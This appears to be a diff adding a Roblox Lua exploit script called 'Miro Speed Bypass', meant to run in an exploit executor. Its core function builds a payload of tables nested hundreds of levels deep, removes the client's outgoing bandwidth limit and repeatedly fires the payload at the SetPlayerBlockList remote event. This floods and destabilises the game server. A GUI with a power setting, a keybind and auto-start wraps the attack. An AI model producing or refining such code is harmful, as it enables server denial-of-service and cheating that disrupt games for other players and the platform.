@@ -1,0 +1,437 @@
+-- Miro Speed Bypass - Standalone
+repeat task.wait() until game:IsLoaded()
+
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local NetworkClient = game:GetService("NetworkClient")
+
+-- Config
+local saveFile = "MiroSpeedBypass.json"
+local Config = {
+    Power = 97000,
+    Keybind = "V",
+    Enabled = false
+}
+
+-- Load config
+if isfile and isfile(saveFile) then
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(saveFile)) end)
+    if ok and data then
+        if type(data.Power) == "number" then Config.Power = math.clamp(data.Power, 10000, 500000) end
+        if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
+        if type(data.Enabled) == "boolean" then Config.Enabled = data.Enabled end
+    end
+end
+
+local function Save()
+    if writefile then
+        pcall(function() writefile(saveFile, HttpService:JSONEncode(Config)) end)
+    end
+end
+
+-- Cleanup old GUI
+for _, v in ipairs(CoreGui:GetChildren()) do
+    if v.Name == "MiroSpeedBypass" then v:Destroy() end
+end
+
+-- Bypass logic
+local running = false
+local preBuiltBomb = nil
+local bypassThread = nil
+local DEPTH = 296
+
+local function buildBomb(power)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, DEPTH do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maxRep = math.floor(power / (DEPTH + 2))
+    for i = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+local function StartBypass()
+    if running then return end
+    running = true
+    Config.Enabled = true
+    Save()
+
+    pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+    preBuiltBomb = buildBomb(Config.Power)
+
+    bypassThread = task.spawn(function()
+        while running do
+            if preBuiltBomb then
+                pcall(function()
+                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(preBuiltBomb)
+                end)
+            end
+            task.wait(0.17)
+        end
+    end)
+end
+
+local function StopBypass()
+    running = false
+    Config.Enabled = false
+    Save()
+    if bypassThread then task.cancel(bypassThread) end
+    bypassThread = nil
+    preBuiltBomb = nil
+    pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
+end
+
+local function ToggleBypass()
+    if running then StopBypass() else StartBypass() end
+end
+
+-- ==================== GUI ====================
+local MiroSpeedBypass = Instance.new("ScreenGui")
+MiroSpeedBypass.Name = "MiroSpeedBypass"
+MiroSpeedBypass.ResetOnSpawn = false
+MiroSpeedBypass.Parent = CoreGui
+
+local Frame = Instance.new("Frame")
+Frame.Name = "Frame"
+Frame.Active = true
+Frame.ClipsDescendants = true
+Frame.Position = UDim2.new(0.5, -130, 0.5, -85)
+Frame.Size = UDim2.new(0, 260, 0, 220)
+Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+Frame.Parent = MiroSpeedBypass
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.Name = "UICorner"
+    UICorner.Parent = Frame
+
+    local UIStroke = Instance.new("UIStroke")
+    UIStroke.Name = "UIStroke"
+    UIStroke.Color = Color3.fromRGB(80, 80, 80)
+    UIStroke.Thickness = 1.5
+    UIStroke.Parent = Frame
+
+    local Frame2 = Instance.new("Frame")
+    Frame2.Name = "Frame"
+    Frame2.Size = UDim2.new(1, 0, 0, 35)
+    Frame2.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+    Frame2.Parent = Frame
+    Frame2.Active = true
+
+        local UICorner2 = Instance.new("UICorner")
+        UICorner2.Name = "UICorner"
+        UICorner2.Parent = Frame2
+
+        local Frame3 = Instance.new("Frame")
+        Frame3.Name = "Frame"
+        Frame3.Position = UDim2.new(1, -55, 0, 0)
+        Frame3.Size = UDim2.new(0, 50, 1, 0)
+        Frame3.BackgroundTransparency = 1
+        Frame3.Parent = Frame2
+
+            local PercentLabel = Instance.new("TextLabel")
+            PercentLabel.Name = "PercentLabel"
+            PercentLabel.Size = UDim2.new(1, 0, 0.4, 0)
+            PercentLabel.BackgroundTransparency = 1
+            PercentLabel.Text = "100%"
+            PercentLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            PercentLabel.Font = Enum.Font.Gotham
+            PercentLabel.TextXAlignment = Enum.TextXAlignment.Right
+            PercentLabel.Parent = Frame3
+
+            local MinusBtn = Instance.new("TextButton")
+            MinusBtn.Name = "MinusBtn"
+            MinusBtn.Position = UDim2.new(0, 0, 0.4, 0)
+            MinusBtn.Size = UDim2.new(0, 18, 0, 18)
+            MinusBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            MinusBtn.Text = "-"
+            MinusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            MinusBtn.TextSize = 12
+            MinusBtn.Font = Enum.Font.GothamBold
+            MinusBtn.Parent = Frame3
+
+                local UICorner3 = Instance.new("UICorner")
+                UICorner3.Name = "UICorner"
+                UICorner3.CornerRadius = UDim.new(0, 4)
+                UICorner3.Parent = MinusBtn
+
+            local PlusBtn = Instance.new("TextButton")
+            PlusBtn.Name = "PlusBtn"
+            PlusBtn.Position = UDim2.new(0, 22, 0.4, 0)
+            PlusBtn.Size = UDim2.new(0, 18, 0, 18)
+            PlusBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            PlusBtn.Text = "+"
+            PlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            PlusBtn.TextSize = 12
+            PlusBtn.Font = Enum.Font.GothamBold
+            PlusBtn.Parent = Frame3
+
+                local UICorner4 = Instance.new("UICorner")
+                UICorner4.Name = "UICorner"
+                UICorner4.CornerRadius = UDim.new(0, 4)
+                UICorner4.Parent = PlusBtn
+
+            local TitleLabel = Instance.new("TextLabel")
+            TitleLabel.Name = "TitleLabel"
+            TitleLabel.Position = UDim2.new(0, 12, 0, 0)
+            TitleLabel.Size = UDim2.new(1, -24, 1, 0)
+            TitleLabel.BackgroundTransparency = 1
+            TitleLabel.Text = "MIRO SPEED BYPASS"
+            TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            TitleLabel.TextSize = 13
+            TitleLabel.Font = Enum.Font.GothamBold
+            TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+            TitleLabel.Parent = Frame2
+
+        local Frame4 = Instance.new("Frame")
+        Frame4.Name = "Frame"
+        Frame4.Position = UDim2.new(0, 10, 0, 42)
+        Frame4.Size = UDim2.new(1, -20, 1, -52)
+        Frame4.BackgroundTransparency = 1
+        Frame4.Parent = Frame
+
+            local UIListLayout = Instance.new("UIListLayout")
+            UIListLayout.Name = "UIListLayout"
+            UIListLayout.Padding = UDim.new(0, 10)
+            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+            UIListLayout.Parent = Frame4
+
+            local ToggleBtn = Instance.new("TextButton")
+            ToggleBtn.Name = "ToggleBtn"
+            ToggleBtn.Size = UDim2.new(1, 0, 0, 38)
+            ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+            ToggleBtn.Text = running and "STATUS: ENABLED" or "STATUS: DISABLED"
+            ToggleBtn.TextColor3 = running and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(200, 200, 200)
+            ToggleBtn.TextSize = 13
+            ToggleBtn.Font = Enum.Font.GothamBold
+            ToggleBtn.AutoButtonColor = false
+            ToggleBtn.Parent = Frame4
+
+                local UICorner5 = Instance.new("UICorner")
+                UICorner5.Name = "UICorner"
+                UICorner5.CornerRadius = UDim.new(0, 6)
+                UICorner5.Parent = ToggleBtn
+
+                local ToggleStroke = Instance.new("UIStroke")
+                ToggleStroke.Name = "UIStroke"
+                ToggleStroke.Color = running and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(70, 70, 70)
+                ToggleStroke.Parent = ToggleBtn
+
+            local PowerFrame = Instance.new("Frame")
+            PowerFrame.Name = "PowerFrame"
+            PowerFrame.Size = UDim2.new(1, 0, 0, 55)
+            PowerFrame.BackgroundTransparency = 1
+            PowerFrame.Parent = Frame4
+
+                local PowerLabel = Instance.new("TextLabel")
+                PowerLabel.Name = "PowerLabel"
+                PowerLabel.Size = UDim2.new(1, 0, 0, 16)
+                PowerLabel.BackgroundTransparency = 1
+                PowerLabel.Text = "Power:"
+                PowerLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
+                PowerLabel.TextSize = 11
+                PowerLabel.Font = Enum.Font.Gotham
+                PowerLabel.TextXAlignment = Enum.TextXAlignment.Left
+                PowerLabel.Parent = PowerFrame
+
+                local PowerBox = Instance.new("TextBox")
+                PowerBox.Name = "PowerBox"
+                PowerBox.Position = UDim2.new(0, 0, 0, 18)
+                PowerBox.Size = UDim2.new(1, 0, 0, 28)
+                PowerBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+                PowerBox.Text = tostring(Config.Power)
+                PowerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+                PowerBox.TextSize = 12
+                PowerBox.Font = Enum.Font.GothamBold
+                PowerBox.ClearTextOnFocus = false
+                PowerBox.Parent = PowerFrame
+
+                    local UICorner6 = Instance.new("UICorner")
+                    UICorner6.Name = "UICorner"
+                    UICorner6.CornerRadius = UDim.new(0, 6)
+                    UICorner6.Parent = PowerBox
+
+                local RangeLabel = Instance.new("TextLabel")
+                RangeLabel.Name = "RangeLabel"
+                RangeLabel.Position = UDim2.new(0, 0, 0, 48)
+                RangeLabel.Size = UDim2.new(1, 0, 0, 10)
+                RangeLabel.BackgroundTransparency = 1
+                RangeLabel.Text = "10k-500k"
+                RangeLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
+                RangeLabel.Font = Enum.Font.Gotham
+                RangeLabel.Parent = PowerFrame
+
+            local KeybindFrame = Instance.new("Frame")
+            KeybindFrame.Name = "KeybindFrame"
+            KeybindFrame.Size = UDim2.new(1, 0, 0, 28)
+            KeybindFrame.BackgroundTransparency = 1
+            KeybindFrame.Parent = Frame4
+
+                local KeybindLabel = Instance.new("TextLabel")
+                KeybindLabel.Name = "KeybindLabel"
+                KeybindLabel.Size = UDim2.new(0.5, 0, 1, 0)
+                KeybindLabel.BackgroundTransparency = 1
+                KeybindLabel.Text = "Toggle Keybind:"
+                KeybindLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
+                KeybindLabel.TextSize = 12
+                KeybindLabel.Font = Enum.Font.Gotham
+                KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+                KeybindLabel.Parent = KeybindFrame
+
+                local KeybindBtn = Instance.new("TextButton")
+                KeybindBtn.Name = "KeybindBtn"
+                KeybindBtn.Position = UDim2.new(0.6, 0, 0, 0)
+                KeybindBtn.Size = UDim2.new(0, 70, 1, 0)
+                KeybindBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+                KeybindBtn.Text = Config.Keybind
+                KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                KeybindBtn.TextSize = 12
+                KeybindBtn.Font = Enum.Font.GothamBold
+                KeybindBtn.Parent = KeybindFrame
+
+                    local UICorner7 = Instance.new("UICorner")
+                    UICorner7.Name = "UICorner"
+                    UICorner7.CornerRadius = UDim.new(0, 5)
+                    UICorner7.Parent = KeybindBtn
+
+            local FooterLabel = Instance.new("TextLabel")
+            FooterLabel.Name = "FooterLabel"
+            FooterLabel.Size = UDim2.new(1, 0, 0, 16)
+            FooterLabel.BackgroundTransparency = 1
+            FooterLabel.Text = ""
+            FooterLabel.TextColor3 = Color3.fromRGB(80, 80, 80)
+            FooterLabel.TextSize = 9
+            FooterLabel.Font = Enum.Font.Gotham
+            FooterLabel.Parent = Frame4
+
+-- ==================== LOGIC ====================
+
+-- Update toggle visuals
+local function updateToggleVisuals()
+    ToggleBtn.Text = running and "STATUS: ENABLED" or "STATUS: DISABLED"
+    ToggleBtn.TextColor3 = running and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(200, 200, 200)
+    ToggleStroke.Color = running and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(70, 70, 70)
+end
+
+-- Toggle button
+ToggleBtn.MouseButton1Click:Connect(function()
+    ToggleBypass()
+    updateToggleVisuals()
+end)
+
+-- Power textbox
+PowerBox.FocusLost:Connect(function()
+    local num = tonumber(PowerBox.Text)
+    if num then
+        Config.Power = math.clamp(num, 10000, 500000)
+    else
+        Config.Power = 97000
+    end
+    PowerBox.Text = tostring(Config.Power)
+    Save()
+    if running then
+        StopBypass()
+        task.wait(0.1)
+        StartBypass()
+    end
+end)
+
+-- Minus/Plus buttons
+local function adjustPower(delta)
+    Config.Power = math.clamp(Config.Power + delta, 10000, 500000)
+    PowerBox.Text = tostring(Config.Power)
+    Save()
+    if running then
+        StopBypass()
+        task.wait(0.1)
+        StartBypass()
+    end
+end
+
+MinusBtn.MouseButton1Click:Connect(function()
+    adjustPower(-1000)
+end)
+
+PlusBtn.MouseButton1Click:Connect(function()
+    adjustPower(1000)
+end)
+
+-- Keybind changing
+local listeningForKey = false
+KeybindBtn.MouseButton1Click:Connect(function()
+    if listeningForKey then return end
+    listeningForKey = true
+    KeybindBtn.Text = "..."
+    KeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
+
+    local conn
+    conn = UserInputService.InputBegan:Connect(function(input, processed)
+        if processed then return end
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            Config.Keybind = input.KeyCode.Name
+            KeybindBtn.Text = Config.Keybind
+            KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            listeningForKey = false
+            Save()
+            if conn then conn:Disconnect() end
+        end
+    end)
+
+    task.delay(5, function()
+        if listeningForKey then
+            listeningForKey = false
+            KeybindBtn.Text = Config.Keybind
+            KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            if conn then conn:Disconnect() end
+        end
+    end)
+end)
+
+-- Keybind listener
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed or listeningForKey then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == Config.Keybind then
+        ToggleBypass()
+        updateToggleVisuals()
+    end
+end)
+
+-- Draggable
+local dragging = false
+local dragStart, startPos
+
+Frame2.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+-- Auto-start if was enabled
+if Config.Enabled then
+    task.delay(1, function()
+        ToggleBypass()
+        updateToggleVisuals()
+    end)
+end
